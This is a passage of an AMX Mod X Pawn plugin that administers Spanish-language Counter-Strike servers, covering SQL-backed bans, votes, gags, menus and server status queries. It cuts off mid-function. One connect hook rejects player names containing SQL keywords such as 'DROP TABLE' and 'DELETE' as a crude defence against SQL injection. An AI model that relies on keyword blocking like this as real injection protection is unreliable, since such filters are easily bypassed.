#include <dg>

#include <sockets_async>
#include <regex>
#include <sqlx>

#pragma semicolon 1;

new const __PLUGIN_NAME[] = "Amx Mod X";
new const __PLUGIN_VERSION[] = "2.1";
new const __PLUGIN_AUTHOR[] = "Atsu:)";

new const __ENT_CLASSNAME_BANS[] = "entThinkBans";
new const __ENT_CLASSNAME_ADV[] = "entThinkAdv";

new const __SQL_LOG_FILE[] = "mysql.log";
new const __DESTROY_LOG_FILE[] = "destroy.log";
new const __QUIT_LOG_FILE[] = "quit.log";

new const __TEAM_NAMES[TeamName][] = {"", "TERRORISTA", "ANTI-TERRORISTA", "ESPECTADOR"};

new const __SOUND_INTRO[] = "dg/dg_intro4.wav";

new const __GFX_BANNER[] = "gfx/drunkgaming.tga";

const Float:BANS_NEXTTHINK = 30.0; // Tiempo (en segundos) en el que tarda en chequear los baneos finalizados
const MAX_ADVS = 32;
const Float:ADV_NEXTTHINK = 180.0; // Tiempo (en segundos) en el que tarda en mostrar el siguiente anuncio
const MAX_LAST_PLAYERS = 32;
const MAX_BAN_TIME = 10080; // Tiempo (en minutos) máximos de ban sobre un jugador
const MAX_VOTES = 5; // Cantidad de votos máximos
const VOTEUSER_PERCENT = 70; // Porcentaje de cantidad de jugadores que se necesitan para expulsar a un jugador votado

enum _:structIdTasks (+= 12) {
	TASK_SOUND_INTRO = 100,
	TASK_CHECK_BAN,
	TASK_CHECK_BAN_KICKED,
	TASK_DISPLAY_HELP,
	TASK_UPDATE_INFO_PRE,
	TASK_UPDATE_INFO_POST,
	TASK_GAG,

	TASK_SET_CONFIG,
	TASK_RELOAD_ADMINS,
	TASK_SAY_ADMIN,
	TASK_SOCKETS_CLOSE,
	TASK_VOTE_END,
	TASK_CHANGEMAP
};

enum _:structAdmins {
	adminId,
	adminName[MAX_NAME_LENGTH],
	adminLastIp[MAX_IP_LENGTH],
	adminLastSteamId[MAX_AUTHID_LENGTH],
	adminPassword[34],
	adminAccess[32],
	adminFinish,
	adminForumId,
	adminServerId,
	adminDemo
};

new g_PlayerName[MAX_PLAYERS + 1][MAX_NAME_LENGTH];
new g_PlayerIp[MAX_PLAYERS + 1][MAX_IP_LENGTH];
new g_PlayerSteamId[MAX_PLAYERS + 1][MAX_AUTHID_LENGTH];
new g_AdminName[MAX_PLAYERS + 1][MAX_NAME_LENGTH];
new g_VoteMapChoose_Id[MAX_PLAYERS + 1][MAX_VOTES];
new g_Vote_Id[MAX_PLAYERS + 1];
new g_Vote_AlreadyVote[MAX_PLAYERS + 1];
new g_VoteUser_Votes[MAX_PLAYERS + 1];
new g_VoteUser_LastVote[MAX_PLAYERS + 1][MAX_PLAYERS + 1];
new g_VoteUser_AlreadyVote[MAX_PLAYERS + 1];
new g_VoteUser_LastTime[MAX_PLAYERS + 1];
new g_Gag[MAX_PLAYERS + 1];
new g_MenuPage_Mute[MAX_PLAYERS + 1];
new g_MenuPage_Servers[MAX_PLAYERS + 1];
new g_MenuPage_Users[MAX_PLAYERS + 1];
new g_MenuPage_BanDisconnect[MAX_PLAYERS + 1];
new g_MenuPage_Maps[MAX_PLAYERS + 1];
new g_MenuData_ServerId[MAX_PLAYERS + 1];
new g_MenuData_UserId[MAX_PLAYERS + 1];
new TeamName:g_MenuData_TeamId[MAX_PLAYERS + 1];
new g_MenuData_BanTime[MAX_PLAYERS + 1];
new g_MenuData_BanReason[MAX_PLAYERS + 1][64];
new g_MenuData_BanDisconnectId[MAX_PLAYERS + 1];
new g_MenuData_BanDisconnect[MAX_PLAYERS + 1];
new g_MenuData_BanDisconnectTime[MAX_PLAYERS + 1];
new g_MenuData_BanDisconnectReason[MAX_PLAYERS + 1][64];
new g_SpectBanner[MAX_PLAYERS + 1];

new g_CurrentMap[MAX_CHARACTER_MAPNAME];
new g_LastMap[MAX_CHARACTER_MAPNAME];
new g_Message_TextMsg;
new g_Message_SayText;
new g_HudSync_SayAdmin;
new g_pCvar_SlotReservation;
new g_pCvar_Servers;
new Handle:g_SqlTuple;
new Handle:g_SqlConnection;
new g_SqlQuery[1024];
new Trie:g_tAdmins;
new g_AdminsCount;
new Regex:g_rIpPattern;
new Regex:g_rSteamIdPattern;
new g_rReturn;
new g_BansEnt;
new g_ServerId;
new any:g_Sockets[structIdServers];
new g_ServerName[structIdServers][64];
new g_ServerPlayers[structIdServers];
new g_ServerMaxPlayers[structIdServers];
new g_ServerCurrentMap[structIdServers][MAX_CHARACTER_MAPNAME];
new g_AdvTotal;
new g_AdvNotice;
new g_AdvMessage[MAX_ADVS][128];
new g_AdvEnt;
new g_AdminChatCount;
new g_AdminChatMessage[4][MAX_CHARACTER_SAY + 1];
new g_AdminChat[((MAX_CHARACTER_SAY + 1) * 4)];
new g_LastPlayers_Count = 0;
new g_LastPlayers_Name[MAX_LAST_PLAYERS][MAX_NAME_LENGTH];
new g_LastPlayers_Ip[MAX_LAST_PLAYERS][MAX_IP_LENGTH];
new g_LastPlayers_SteamId[MAX_LAST_PLAYERS][MAX_AUTHID_LENGTH];
new g_LastPlayers_LastTime[MAX_LAST_PLAYERS];
new Array:g_aMapName;
new g_VoteMap_AllMaps = 0;
new g_Vote_Init = 0;
new g_Vote_AdminId = 0;
new g_Vote_MaxVotes = 0;
new g_Vote_End = 0;
new g_Vote_Question[64];
new g_Vote_Answers[MAX_VOTES][64];
new g_Vote_VoteCount[MAX_VOTES];

#define isUserValid(%0) (1 <= %0 <= MaxClients)
#define isUserValidConnected(%0) (isUserValid(%0) && is_user_connected(%0))
#define isValidSteamId(%0) (regex_match_c(%0, g_rSteamIdPattern, g_rReturn) > 0)
#define isValidIp(%0) (regex_match_c(%0, g_rIpPattern, g_rReturn) > 0)

public plugin_precache() {
	get_mapname(g_CurrentMap, charsmax(g_CurrentMap));
	strtolower(g_CurrentMap);

	get_localinfo("amx_lastmap", g_LastMap, charsmax(g_LastMap));

	if(!g_LastMap[0]) {
		formatex(g_LastMap, charsmax(g_LastMap), "[ninguno]");
	}

	set_localinfo("amx_lastmap", "");

	g_aMapName = ArrayCreate(32);

	precache_sound(__SOUND_INTRO);

	precache_generic(__GFX_BANNER);
}

public plugin_natives() {
	register_library("dg");

	register_native("dg_get_user_adminid", "native__GetUserAdminId", 1);
	register_native("dg_get_user_forumid", "native__GetUserForumId", 1);
	register_native("dg_get_user_mute", "native__GetUserMute", 1);

	register_native("dg_get_server_id", "native__GetServerId", 1);
}

public plugin_init() {
	register_plugin(__PLUGIN_NAME, __PLUGIN_VERSION, __PLUGIN_AUTHOR);

	copy(g_PlayerName[0], charsmax(g_PlayerName[]), __PLUGIN_COMMUNITY_FORUM);
	copy(g_PlayerIp[0], charsmax(g_PlayerIp[]), __SERVERS[SV_NONE][serverIp]);
	g_PlayerSteamId[0][0] = EOS;

	RegisterHookChain(RG_CSGameRules_RestartRound, "CSGameRules_RestartRound_Pre", false);

	RegisterHookChain(RG_CBasePlayer_DropIdlePlayer, "CBasePlayer_DropIdlePlayer_Pre", false);
	RegisterHookChain(RG_CBasePlayer_SetClientUserInfoName, "CBasePlayer_SetClientUserInfoName_Pre", false);

	register_logevent("logEvent__JoinedTeam", 3, "1=joined team");

	register_clcmd("BAN_TIME", "clcmd__BanTime");
	register_clcmd("BAN_REASON", "clcmd__BanReason");

	register_clcmd("+noclip", "clcmd__NoClip");
	register_clcmd("-noclip", "clcmd__NoClip");
	register_clcmd("+godmode", "clcmd__GodMode");
	register_clcmd("-godmode", "clcmd__GodMode");

	register_clcmd("say thetime", "clcmd__TheTime");
	register_clcmd("say timeleft", "clcmd__TimeLeft");
	register_clcmd("say /mute", "clcmd__Mute");
	register_clcmd("say /vencimiento", "clcmd__Expiry");
	register_clcmd("say /vip", "clcmd__Vip");
	register_clcmd("say /admin", "clcmd__Admin");
	register_clcmd("say /server", "clcmd__Servers");
	register_clcmd("say /servers", "clcmd__Servers");
	register_clcmd("say /sv", "clcmd__Servers");
	register_clcmd("say /on", "clcmd__Online");

	register_clcmd("vote", "clcmd__Vote");
	register_clcmd("say", "clcmd__Say");
	register_clcmd("say_team", "clcmd__SayTeam");

	register_concmd("amx_refresh_servers", "concmd__RefreshServers"); // ADMIN_LEVEL_H
	register_concmd("amx_suspend_admin", "concmd__SuspendAdmin"); // ADMIN_LEVEL_H
	register_concmd("amxmodmenu", "concmd__AmdModMenu"); // ADMIN_IMMUNITY
	register_concmd("amx_say", "concmd__AllSay"); // ADMIN_IMMUNITY
	register_concmd("amx_psay", "concmd__PrivateSay"); // ADMIN_IMMUNITY
	register_concmd("amx_kick", "concmd__Kick"); // ADMIN_IMMUNITY
	register_concmd("amx_kickmenu", "concmd__KickMenu"); // ADMIN_IMMUNITY
	register_concmd("amx_slay", "concmd__Slay"); // ADMIN_IMMUNITY
	register_concmd("amx_slaymenu", "concmd__SlayMenu"); // ADMIN_IMMUNITY
	register_concmd("amx_slap", "concmd__Slap"); // ADMIN_IMMUNITY
	register_concmd("amx_slapmenu", "concmd__SlapMenu"); // ADMIN_IMMUNITY
	register_concmd("amx_teammenu", "concmd__TeamMenu"); // ADMIN_IMMUNITY
	register_concmd("amx_ban", "concmd__Ban"); // ADMIN_IMMUNITY
	register_concmd("amx_banip", "concmd__BanIp"); // ADMIN_IMMUNITY
	register_concmd("amx_addban", "concmd__AddBan"); // ADMIN_LEVEL_D
	register_concmd("amx_unban", "concmd__UnBan"); // ADMIN_LEVEL_D
	register_concmd("amx_cvar", "concmd__Cvar"); // ADMIN_LEVEL_E
	register_concmd("amx_map", "concmd__Map"); // ADMIN_LEVEL_D
	register_concmd("amx_restart", "concmd__Restart"); // ADMIN_LEVEL_D
	register_concmd("amx_extend", "concmd__Extend"); // ADMIN_LEVEL_E
	register_concmd("amx_nextmap_c", "concmd__NextMapC"); // ADMIN_LEVEL_E
	register_concmd("amx_who", "concmd__Who"); // ADMIN_IMMUNITY
	register_concmd("amx_last", "concmd__Last"); // ADMIN_IMMUNITY
	register_concmd("amx_mapmenu", "concmd__MapMenu"); // ADMIN_IMMUNITY
	register_concmd("amx_votemapmenu", "concmd__VoteMapMenu"); // ADMIN_IMMUNITY
	register_concmd("amx_vote", "concmd__VoteC"); // ADMIN_IMMUNITY
	register_concmd("amx_voteadm", "concmd__VoteC"); // ADMIN_IMMUNITY
	register_concmd("amx_votemap", "concmd__VoteMap"); // ADMIN_IMMUNITY
	register_concmd("amx_gag", "concmd__Gag"); // ADMIN_IMMUNITY
	register_concmd("amx_gagmenu", "concmd__GagMenu"); // ADMIN_IMMUNITY
	register_concmd("amx_ungag", "concmd__UnGag"); // ADMIN_IMMUNITY
	register_concmd("amx_ungagmenu", "concmd__UnGagMenu"); // ADMIN_IMMUNITY
	register_concmd("amx_destroy", "concmd__Destroy"); // ADMIN_LEVEL_F
	register_concmd("amx_quit", "concmd__Quit"); // ADMIN_LEVEL_E
	register_concmd("amx_exec", "concmd__Exec"); // ADMIN_LEVEL_E
	register_srvcmd("amx_exec", "concmd__Exec"); // ADMIN_LEVEL_E

	oldmenu_register();

	g_Message_TextMsg = get_user_msgid("TextMsg");
	g_Message_SayText = get_user_msgid("SayText");

	g_HudSync_SayAdmin = CreateHudSyncObj();

	g_pCvar_SlotReservation = register_cvar("amx_slot_reservation", "1");
	g_pCvar_Servers = register_cvar("amx_servers", "1");

	set_member_game(m_GameDesc, __PLUGIN_COMMUNITY_NAME);

	loadSql();
}

public plugin_cfg() {
	g_AdminChatMessage[0][0] = EOS;
	g_AdminChatMessage[1][0] = EOS;
	g_AdminChatMessage[2][0] = EOS;
	g_AdminChatMessage[3][0] = EOS;

	arrayset(g_Vote_VoteCount, 0, MAX_VOTES);

	remove_task(TASK_SET_CONFIG);
	set_task(1.0, "task__SetConfigs", TASK_SET_CONFIG);
}

public plugin_end() {
	saveMapStats();

	set_localinfo("amx_lastmap", g_CurrentMap);

	SQL_FreeHandle(g_SqlConnection);
	SQL_FreeHandle(g_SqlTuple);

	TrieDestroy(g_tAdmins);
}

public client_connectex(id, const name[], const ip[], reason[128]) {
	copy(g_PlayerName[id], charsmax(g_PlayerName[]), name);

	if(containi(g_PlayerName[id], "..") != -1 ||
	containi(g_PlayerName[id], "SteamBoost") != -1 ||
	(containi(g_PlayerName[id], "DROP TABLE") != -1 || containi(g_PlayerName[id], "TRUNCATE") != -1 || containi(g_PlayerName[id], "INSERT") != -1 || containi(g_PlayerName[id], "UPDATE") != -1 || containi(g_PlayerName[id], "DELETE") != -1) ||
	checkStringInvalid(g_PlayerName[id]) ||
	checkStringOnSpam(g_PlayerName[id])) {
		formatex(reason, charsmax(reason), "Tu nombre contiene caracteres o símbolos prohibidos/inválidos. Inténtalo más tarde.");
		return PLUGIN_HANDLED;
	}

	new sIp[MAX_IP_WITH_PORT_LENGTH];
	new sPort[8];

	copy(sIp, charsmax(sIp), ip);
	strtok(sIp, g_PlayerIp[id], charsmax(g_PlayerIp[]), sPort, charsmax(sPort), ':');

	return PLUGIN_CONTINUE;
}

public client_connect(id) {
	new i;

	for(i = 0; i < MAX_VOTES; ++i) {
		g_VoteMapChoose_Id[id][i] = -1;
	}
	g_Vote_Id[id] = -1;
	g_Vote_AlreadyVote[id] = 0;
	g_VoteUser_Votes[id] = 0;
	for(i = 0; i <= MaxClients; ++i) {
		g_VoteUser_LastVote[id][i] = 0;
	}
	g_VoteUser_AlreadyVote[id] = 0;
	g_VoteUser_LastTime[id] = 0;
	g_Gag[id] = 0;
	g_MenuPage_Mute[id] = 0;
	g_MenuPage_Servers[id] = 0;
	g_MenuPage_Users[id] = 0;
	g_MenuPage_BanDisconnect[id] = 0;
	g_MenuPage_Maps[id] = 0;
	g_MenuData_ServerId[id] = 0;
	g_MenuData_UserId[id] = 0;
	g_MenuData_TeamId[id] = TEAM_UNASSIGNED;
	g_MenuData_BanTime[id] = 0;
	g_MenuData_BanReason[id][0] = EOS;
	g_MenuData_BanDisconnectId[id] = 0;
	g_MenuData_BanDisconnect[id] = 0;
	g_MenuData_BanDisconnectTime[id] = 0;
	g_MenuData_BanDisconnectReason[id][0] = EOS;
	g_SpectBanner[id] = 1;
}

public client_authorized(id, const authid[]) {
	copy(g_PlayerSteamId[id], charsmax(g_PlayerSteamId[]), authid);

	checkSlotReservation(id);
}

public client_putinserver(id) {
	client_cmd(id, "httpstop");

	if(!is_user_bot(id) && !is_user_hltv(id)) {
		remove_task(id + TASK_SOUND_INTRO);
		remove_task(id + TASK_CHECK_BAN);

		set_task(0.1, "task__SoundIntro", id + TASK_SOUND_INTRO);
		set_task(1.0, "task__CheckBan", id + TASK_CHECK_BAN);
	}
}

public client_disconnected(id, bool:drop, message[], maxlen) {
	client_cmd(id, "httpstop");
	client_cmd(id, "stopsound");

	remove_task(id + TASK_SOUND_INTRO);
	remove_task(id + TASK_CHECK_BAN);
	remove_task(id + TASK_CHECK_BAN_KICKED);
	remove_task(id + TASK_DISPLAY_HELP);
	remove_task(id + TASK_UPDATE_INFO_PRE);
	remove_task(id + TASK_UPDATE_INFO_POST);

	checkGagOnDisconnect(id);
	getLastPlayersOnDisconnect(id);
	checkVotesOnDisconnect(id);
	checkVotesUsersOnDisconnect(id);

	g_AdminName[id][0] = EOS;
}

public fw_sockReadable(SOCKET:socket, id, type) {
	if(!get_pcvar_num(g_pCvar_Servers)) {
		return;
	}

	new sData[256];
	new iNull;
	new iLen;

	socket_recvfrom(socket, sData, charsmax(sData), "", 0, iNull);

	if(sData[4] == 'I') {
		iLen = 6;
		formatex(g_ServerName[id], charsmax(g_ServerName[]), "%s", sData[iLen]);
		iLen += (strlen(sData[iLen]) + 1);
		formatex(g_ServerCurrentMap[id], charsmax(g_ServerCurrentMap[]), "%s", sData[iLen]);
		iLen += (strlen(sData[iLen]) + 1);
		iLen += (strlen(sData[iLen]) + 1);
		iLen += (strlen(sData[iLen]) + 3);
		g_ServerPlayers[id] = sData[iLen];
		g_ServerMaxPlayers[id] = sData[(iLen + 1)];
	} else if(sData[4] == 'm') {
		iLen = 5;
		iLen += (strlen(sData[iLen]) + 1);
		formatex(g_ServerName[id], charsmax(g_ServerName[]), "%s", sData[iLen]);
		iLen += (strlen(sData[iLen]) + 1);
		formatex(g_ServerCurrentMap[id], charsmax(g_ServerCurrentMap[]), "%s", sData[iLen]);
		iLen += (strlen(sData[iLen]) + 1);
		iLen += (strlen(sData[iLen]) + 1);
		iLen += (strlen(sData[iLen]) + 1);
		g_ServerPlayers[id] = sData[iLen];
		g_ServerMaxPlayers[id] = sData[(iLen + 1)];
	}

	g_Sockets[id] = false;
	socket_close(socket);
}

public CSGameRules_RestartRound_Pre() {
	if(get_pcvar_num(g_pCvar_Servers)) {
		refreshServers();
	}
}

public CBasePlayer_DropIdlePlayer_Pre(const id, const reason[])  {
	if((get_user_flags(id) & ADMIN_IMMUNITY)) {
		return HC_SUPERCEDE;
	}

	if(!get_cvar_num("mp_autokick")) {
		return HC_SUPERCEDE;
	}

	clientPrintColor(0, id, "!t%s!y fue expulsado por estar demasiado tiempo inactivo.", g_PlayerName[id]);

	SetHookChainArg(2, ATYPE_STRING, "Fuiste expulsado por estar demasiado tiempo inactivo.");
	return HC_CONTINUE;
}

public CBasePlayer_SetClientUserInfoName_Pre(const id, const info_buffer[], const new_name[]) {
	if(get_entvar(id, var_deadflag) != DEAD_NO) {
		set_msg_block(g_Message_TextMsg, BLOCK_ONCE);
	} else {
		set_msg_block(g_Message_SayText, BLOCK_ONCE);
	}

	get_user_name(id, g_PlayerName[id], charsmax(g_PlayerName[]));

	client_cmd(id, "name ^"%s^"; setinfo name ^"%s^"", g_PlayerName[id], g_PlayerName[id]);
	set_user_info(id, "name", g_PlayerName[id]);

	consolePrint(id, "Si quieres cambiarte el nombre, debes desconectarte para hacerlo.");

	SetHookChainArg(3, ATYPE_STRING, g_PlayerName[id]);
	SetHookChainReturn(ATYPE_BOOL, false);

	return HC_SUPERCEDE;
}

public logEvent__JoinedTeam() {
	new sLogUser[128];
	new sName[MAX_NAME_LENGTH];
	new iId;

	read_logargv(0, sLogUser, charsmax(sLogUser));
	parse_loguser(sLogUser, sName, charsmax(sName));
	iId = get_user_index(sName);

	if(isUserValidConnected(iId) && g_SpectBanner[iId]) {
		g_SpectBanner[iId] = 0;

		message_begin(MSG_ONE, SVC_DIRECTOR, _, iId);
		write_byte((strlen(__GFX_BANNER) + 2));
		write_byte(DRC_CMD_BANNER);
		write_string(__GFX_BANNER);
		message_end();
	}
}

public think__Bans(const ent) {
	if(ent == g_BansEnt) {
		static Handle:sqlQuery;
		sqlQuery = SQL_PrepareQuery(g_SqlConnection, "SELECT `user_name`, `user_authid`, `reason` FROM `gral_bans` WHERE (`finish`<'%d' AND `server_id`='%d' AND `active`='1');", get_arg_systime(), g_ServerId);

		if(!SQL_Execute(sqlQuery)) {
			executeQuery(0, sqlQuery, 1);
		} else if(SQL_NumResults(sqlQuery)) {
			static sUserName[MAX_NAME_LENGTH];
			static sUserAuthid[MAX_AUTHID_LENGTH];
			static sReason[64];

			while(SQL_MoreResults(sqlQuery)) {
				SQL_ReadResult(sqlQuery, 0, sUserName, charsmax(sUserName));

				SQL_ReadResult(sqlQuery, 1, sUserAuthid, charsmax(sUserAuthid));
				removeBan(sUserAuthid);

				SQL_ReadResult(sqlQuery, 2, sReason, charsmax(sReason));

				clientPrintColor(0, _, "!g%s!y ha sido desbaneado - Razón [!g%s!y].", sUserName, sReason);
				log_amx("<%s><%s> ha sido desbaneado - Razón <%s>", sUserName, sUserAuthid, sReason);

				SQL_NextRow(sqlQuery);
			}

			SQL_FreeHandle(sqlQuery);
		} else {
			SQL_FreeHandle(sqlQuery);
		}

		set_entvar(g_BansEnt, var_nextthink, (get_gametime() + BANS_NEXTTHINK));
	}
}

public think__Adv(const ent) {
	if(ent == g_AdvEnt) {
		clientPrintColor(0, print_team_grey, "%s.", g_AdvMessage[g_AdvNotice]);

		++g_AdvNotice;

		if(g_AdvNotice == g_AdvTotal) {
			g_AdvNotice = 0;
		}

		set_entvar(ent, var_nextthink, (get_gametime() + ADV_NEXTTHINK));
	}
}

public clcmd__NoClip(const id) {
	if(!(get_user_flags(id) & ADMIN_RCON) || !is_user_alive(id)) {
		return PLUGIN_HANDLED;
	}

	new sArg0[2];
	read_argv(0, sArg0, charsmax(sArg0));

	switch(sArg0[0]) {
		case '+': {
			set_entvar(id, var_movetype, MOVETYPE_NOCLIP);
		} case '-': {
			set_entvar(id, var_movetype, MOVETYPE_WALK);
		}
	}

	return PLUGIN_HANDLED;
}

public clcmd__GodMode(const id) {
	if(!(get_user_flags(id) & ADMIN_RCON) || !is_user_alive(id)) {
		return PLUGIN_HANDLED;
	}

	new sArg0[2];
	read_argv(0, sArg0, charsmax(sArg0));

	switch(sArg0[0]) {
		case '+': {
			set_entvar(id, var_flags, (get_entvar(id, var_flags) | FL_GODMODE));
		} case '-': {
			set_entvar(id, var_flags, (get_entvar(id, var_flags) & ~FL_GODMODE));
		}
	}

	return PLUGIN_HANDLED;
}

public clcmd__BanTime(const id) {
	if(!(get_user_flags(id) & ADMIN_IMMUNITY)) {
		return PLUGIN_HANDLED;
	}

	new sTime[8];
	read_args(sTime, charsmax(sTime));
	remove_quotes(sTime);
	trim(sTime);

	if(!isDigital(sTime) || equali(sTime, "") || containi(sTime, " ") != -1) {
		clientPrintColor(id, _, "Sólo números y sin espacios.");
		return PLUGIN_HANDLED;
	}

	new iTime = str_to_num(sTime);

	if(!(0 <= iTime <= MAX_BAN_TIME)) {
		clientPrintColor(id, _, "Solo puedes ingresar hasta 7 días de ban (10.080 minutos). Inclusive permanente (0 minutos).");
		return PLUGIN_HANDLED;
	}

	if(g_MenuData_BanDisconnect[id]) {
		g_MenuData_BanDisconnectTime[id] = iTime;
		showMenu__BanDisconnectInfo(id);
	} else {
		g_MenuData_BanTime[id] = iTime;
		showMenu__BanInfo(id);
	}

	return PLUGIN_HANDLED;
}

public clcmd__BanReason(const id) {
	if(!(get_user_flags(id) & ADMIN_IMMUNITY)) {
		return PLUGIN_HANDLED;
	}

	new sReason[128];
	read_args(sReason, charsmax(sReason));
	remove_quotes(sReason);
	trim(sReason);

	if(equali(sReason, "")) {
		clientPrintColor(id, _, "Ingresa una razón válida.");
		return PLUGIN_HANDLED;
	}

	if(g_MenuData_BanDisconnect[id]) {
		copy(g_MenuData_BanDisconnectReason[id], charsmax(g_MenuData_BanDisconnectReason[]), sReason);
		showMenu__BanDisconnectInfo(id);
	} else {
		copy(g_MenuData_BanReason[id], charsmax(g_MenuData_BanReason[]), sReason);
		showMenu__BanInfo(id);
	}

	return PLUGIN_HANDLED;
}

public clcmd__Vote(const id) {
	if(!is_user_connected(id)) {
		return PLUGIN_HANDLED;
	}

	if(g_ServerId == SV_AMIX1 || g_ServerId == SV_AMIX2) {
		consolePrint(id, "Este comando está deshabilitado en este servidor.");
		return PLUGIN_HANDLED;
	}

	if(g_VoteUser_LastTime[id] > get_arg_systime()) {
		new iRest = (g_VoteUser_LastTime[id] - get_arg_systime());

		consolePrint(id, "Debes esperar !g%s!y para volver a ver la lista de votaciones de usuarios.", getCooldDownTime(iRest));
		return PLUGIN_HANDLED;
	}

	if(read_argc() < 2) {
		console_print(id, "");
		console_print(id, "Usuarios:");
		console_print(id, "");
		console_print(id, "Id || Nombre");
		console_print(id, "");

		new iCount = 0;
		new i;

		for(i = 1; i <= MaxClients; ++i) {
			if(!is_user_connected(i)) {
				continue;
			}

			console_print(id, "%d || %s >>> %s", get_user_userid(i), g_PlayerName[i], getAdminTypeInChat(i));
			++iCount;
		}

		console_print(id, "");
		console_print(id, "Usuarios en total: %d", iCount);
		console_print(id, "");

		return PLUGIN_HANDLED;
	}

	new sVoteNum[8];
	read_argv(1, sVoteNum, charsmax(sVoteNum));

	if(!isDigital(sVoteNum)) {
		consolePrint(id, "El parámetro <#id> no puede contener letras.");
		return PLUGIN_HANDLED;
	}

	new iVoteNum = str_to_num(sVoteNum);

	if(iVoteNum <= 0) {
		consolePrint(id, "El valor del #id que intentas ingresar es inválido.");
		return PLUGIN_HANDLED;
	}

	new i;
	for(i = 1; i <= MaxClients; ++i) {
		if(!is_user_connected(i)) {
			continue;
		}

		if(iVoteNum == get_user_userid(id)) {
			consolePrint(id, "No puedes votarte a ti mismo.");
			return PLUGIN_HANDLED;
		}

		if(iVoteNum == get_user_userid(i)) {
			if((get_user_flags(i) & ADMIN_IMMUNITY)) {
				consolePrint(id, "No puedes votar a un Admin.");
				return PLUGIN_HANDLED;
			}

			if(g_VoteUser_AlreadyVote[id]) {
				new j;
				for(j = 1; j <= MaxClients; ++j) {
					if(!is_user_connected(j)) {
						continue;
					}

					if(g_VoteUser_LastVote[id][j] == get_user_userid(j)) {
						if(g_VoteUser_Votes[j] > 0) {
							--g_VoteUser_Votes[j];
						}
					}
				}
			}

			g_VoteUser_LastVote[id][i] = get_user_userid(i);
			g_VoteUser_AlreadyVote[id] = 1;
			++g_VoteUser_Votes[i];

			consolePrint(id, "Has votado a %s para expulsarlo.", g_PlayerName[i]);
			checkVoteUsers(id, i);
		}
	}

	g_VoteUser_LastTime[id] = (get_arg_systime() + 5);
	return PLUGIN_HANDLED;
}

public clcmd__TheTime(const id) {
	if(!is_user_connected(id)) {
		return PLUGIN_HANDLED;
	}

	new const __MONTHS_NAMES[][] = {"Enero", "Febrero", "Marzo", "Abril", "Mayo", "Junio", "Julio", "Agosto", "Septiembre", "Octubre", "Noviembre", "Diciembre"};
	new const __DAYS_NAMES[][] = {"Domingo", "Lunes", "Martes", "Miércoles", "Jueves", "Viernes", "Sábado"};
	new iSysTime = get_arg_systime();
	new iYear;
	new iMonth;
	new iDay;
	new iHour;
	new iMinute;
	new iSecond;
	new sDayMonth[2];

	unix_to_time(iSysTime, iYear, iMonth, iDay, iHour, iMinute, iSecond);
	get_time("%w", sDayMonth, charsmax(sDayMonth));

	clientPrintColor(id, _, "Fecha: !g%s %02d de %s del %d!y - Hora: !g%02d:%02d!y.", __DAYS_NAMES[(sDayMonth[0] - '0')], iDay, __MONTHS_NAMES[(iMonth - 1)], iYear, iHour, iMinute);
	return PLUGIN_HANDLED;
}

public clcmd__TimeLeft(const id) {
	if(!is_user_connected(id)) {
		return PLUGIN_HANDLED;
	}

	new iTimeLeft = get_timeleft();

	if(iTimeLeft) {
		clientPrintColor(id, _, "Tiempo restante: !g%02d:%02d!y.", (iTimeLeft / 60), (iTimeLeft % 60));
	} else {
		clientPrintColor(id, _, "Tiempo restante: !gIlimitado!y.");
	}

	return PLUGIN_HANDLED;
}

public clcmd__Mute(const id) {
	if(!is_user_connected(id)) {
		return PLUGIN_HANDLED;
	}

	showMenu__MutePlayer(id);
	return PLUGIN_HANDLED;
}

public clcmd__Expiry(const id) {
	if(!is_user_connected(id) || !(get_user_flags(id) & ADMIN_RESERVATION)) {
		return PLUGIN_HANDLED;
	}

	new iAdmins[structAdmins];
	TrieGetArray(g_tAdmins, g_AdminName[id], iAdmins, sizeof(iAdmins));

	if(!iAdmins[adminFinish] || iAdmins[adminFinish] == 2000000000) {
		return PLUGIN_HANDLED;
	}

	clientPrintColor(id, _, "Tu beneficio vencerá el día !t%s!y.", getUnixToTime(iAdmins[adminFinish]));

	new iSysTime = get_arg_systime();
	new iWarning = (iAdmins[adminFinish] - iSysTime);

	if(iWarning <= 864000) {
		clientPrintColor(id, _, "Tu beneficio está a punto de vencerse. Puedes renovarlo ingresando a nuestra web !t%s!y.", __PLUGIN_COMMUNITY_FORUM_SHOP);
	}

	return PLUGIN_HANDLED;
}

public clcmd__Vip(const id) {
	if(!is_user_connected(id)) {
		return PLUGIN_HANDLED;
	}

	new iCountVip = 0;
	new i;
	new iUserFlag;

	for(i = 1; i <= MaxClients; ++i) {
		if(is_user_connected(i)) {
			iUserFlag = get_user_flags(i);

			if((iUserFlag & ADMIN_RESERVATION) && !(iUserFlag & ADMIN_IMMUNITY)) {
				++iCountVip;
			}
		}
	}

	if(iCountVip) {
		clientPrintColor(id, _, "Hay !g%d vip%s!y conectados en el servidor.", iCountVip, ((iCountVip != 1) ? "s" : ""));
	} else {
		clientPrintColor(id, _, "No hay vips conectados en el servidor.");
	}

	return PLUGIN_HANDLED;
}

public clcmd__Admin(const id) {
	if(!is_user_connected(id) || g_ServerId == SV_AMIX1 || g_ServerId == SV_AMIX2) {
		return PLUGIN_HANDLED;
	}

	new iCountAdmins = 0;
	new i;
	new iUserFlag;

	for(i = 1; i <= MaxClients; ++i) {
		if(is_user_connected(i)) {
			iUserFlag = get_user_flags(i);

			if((iUserFlag & ADMIN_IMMUNITY)) {
				++iCountAdmins;
			}
		}
	}

	if(iCountAdmins) {
		clientPrintColor(id, _, "Hay !g%d administrador%s!y conectados en el servidor.", iCountAdmins, ((iCountAdmins != 1) ? "es" : ""));
	} else {
		clientPrintColor(id, _, "No hay administradores conectados en el servidor.");
	}

	return PLUGIN_HANDLED;
}

public clcmd__Servers(const id) {
	if(!is_user_connected(id)) {
		return PLUGIN_HANDLED;
	}

	if(!get_pcvar_num(g_pCvar_Servers)) {
		clientPrintColor(id, _, "Esta funcionalidad está deshabilitada.");
		return PLUGIN_HANDLED;
	}

	showMenu__Servers(id);
	return PLUGIN_HANDLED;
}

public clcmd__Online(const id) {
	if(!is_user_connected(id)) {
		return PLUGIN_HANDLED;
	}

	if(!get_pcvar_num(g_pCvar_Servers)) {
		clientPrintColor(id, _, "Esta funcionalidad está deshabilitada.");
		return PLUGIN_HANDLED;
	}
	
	new iGlobalPlayers = 0;
	new iGlobalMaxPlayers = 0;
	new i;

	for(i = 0; i < structIdServers; ++i) {
		if(i == SV_NONE) {
			continue;
		}

		iGlobalPlayers += g_ServerPlayers[i];
		iGlobalMaxPlayers += g_ServerMaxPlayers[i];
	}

